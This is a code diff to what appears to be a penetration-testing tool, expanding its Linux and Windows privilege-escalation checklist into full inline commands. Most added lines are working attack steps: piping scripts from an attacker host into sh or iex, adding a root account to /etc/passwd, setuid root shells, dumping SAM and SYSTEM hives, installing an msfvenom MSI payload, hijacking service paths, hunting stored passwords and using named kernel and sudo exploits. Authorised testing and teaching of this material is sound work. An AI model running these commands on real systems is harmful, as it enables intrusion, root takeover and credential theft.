@@ -5701,32 +5701,34 @@ _OS_CHOICES = [
 ]
 
 # Privesc checklist per OS family (starter methodology — deeper pass later).
+# The OS checklist renders the description only (no separate command layer), so each step
+# carries its command(s) inline; where no single tool does it, a short how-to-abuse note.
 _PRIVESC_STEPS = {
     "linux": [
-        "Spawn a shell — use a foothold from the service checklists (phase 5 commands)",
-        "Automated enum (linpeas.sh / LinEnum.sh)",
-        "sudo -l — sudo rights → GTFOBins",
-        "SUID/SGID binaries (find / -perm -4000) → GTFOBins",
-        "Capabilities (getcap -r /) → abuse",
-        "Cron jobs & writable scripts / PATH hijack",
-        "Writable /etc/passwd, /etc/shadow, service files",
-        "Kernel version → known exploit (uname -a; searchsploit)",
-        "Interesting files: configs, history, SSH keys, backups, .env",
-        "Internal services / ports (ss -tlnp) → local exploit",
-        "Password reuse & creds in files / process memory",
+        "Spawn & stabilize a shell (foothold from phase 5) — TTY: python3 -c 'import pty;pty.spawn(\"/bin/bash\")' → Ctrl-Z → stty raw -echo; fg → export TERM=xterm",
+        "Automated enum: curl http://<LHOST>/linpeas.sh | sh   (LinEnum.sh alt); ./pspy64 to catch cron/processes without root",
+        "sudo -l → run the GTFOBins escape for each allowed binary; sudo -u#-1 <bin> (CVE-2019-14287); Baron Samedit (CVE-2021-3156)",
+        "SUID/SGID: find / -perm -4000 -type f 2>/dev/null → look each up on GTFOBins (#suid); PwnKit pkexec (CVE-2021-4034)",
+        "Capabilities: getcap -r / 2>/dev/null → cap_setuid on python: python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
+        "Cron: cat /etc/crontab; ls -la /etc/cron.d /etc/cron.* → writable script = inject a shell; relative binary in a job = PATH hijack",
+        "Writable /etc/passwd? openssl passwd -1 pw → append 'r00t:HASH:0:0::/root:/bin/bash' then su r00t; also check /etc/shadow & .service unit files",
+        "Kernel: uname -a; cat /etc/os-release; searchsploit linux kernel <ver> → DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)",
+        "Loot: grep -rniE 'pass(word)?|secret|api[_-]?key' /var/www /home /opt 2>/dev/null; find / -name id_rsa 2>/dev/null; cat ~/.*_history",
+        "Internal-only services: ss -tlnp (or netstat -tulnp) → forward the port out (ssh -L / chisel / socat) and attack it locally",
+        "Cred reuse: su <user> with any password found; strings /proc/*/environ 2>/dev/null; DB/app config files; try it as the sudo password",
     ],
     "windows": [
-        "Spawn a shell — use a foothold from the service checklists (phase 5 commands)",
-        "Automated enum (winPEAS.exe / PrivescCheck)",
-        "whoami /priv — token privileges (SeImpersonate → Potato)",
-        "whoami /groups — group memberships",
-        "Services: unquoted paths, weak perms, writable binaries",
-        "AlwaysInstallElevated (HKLM + HKCU)",
-        "Scheduled tasks & startup items with weak perms",
-        "Stored creds: cmdkey, registry, Unattend.xml, SAM/SYSTEM",
-        "OS build → known exploit (systeminfo; wesng / Sherlock)",
-        "Autologon / SNMP / config files with passwords",
-        "Token impersonation / named-pipe → SYSTEM",
+        "Spawn a shell (foothold from phase 5) — upgrade with ConPtyShell or a meterpreter session for a stable interactive shell",
+        "Automated enum: winPEASx64.exe   (or PowerShell: iwr http://<LHOST>/winPEAS.ps1 | iex); PowerUp.ps1 Invoke-AllChecks; PrivescCheck.ps1",
+        "whoami /priv → SeImpersonate/SeAssignPrimaryToken: PrintSpoofer.exe -i -c cmd  /  GodPotato -cmd 'cmd /c whoami'  (SeBackup/SeDebug also abusable)",
+        "whoami /groups → Backup Operators (SeBackup → reg save SAM), DnsAdmins (DLL), Server Operators, plus any unusual AD group",
+        "Services: accesschk.exe -uwcqv Users * → writable svc: sc config <svc> binPath= 'cmd /c ...' & sc start <svc>; unquoted paths: wmic service get name,pathname",
+        "AlwaysInstallElevated: reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated (+HKCU); if both 1: msfvenom -f msi>x.msi; msiexec /quiet /i x.msi",
+        "Scheduled tasks: schtasks /query /fo LIST /v → a task whose binary/arg path you can write = swap in your payload and wait for the trigger",
+        "Stored creds: cmdkey /list; reg query HKLM /f password /t REG_SZ /s; dir /s Unattend.xml; reg save hklm\\sam sam & reg save hklm\\system system → impacket-secretsdump",
+        "OS build: systeminfo > si.txt; python3 wes.py si.txt  (Watson/Sherlock) → e.g. PrintNightmare, HiveNightmare (CVE-2021-36934)",
+        "Autologon/config pw: reg query 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | findstr Default*Password; findstr /si password *.xml *.ini *.config 2>nul",
+        "No SeImpersonate? named-pipe impersonation, RoguePotato / EfsPotato (SharpEfsPotato.exe), or NTLM-relay the machine account to a DC",
     ],
 }
 
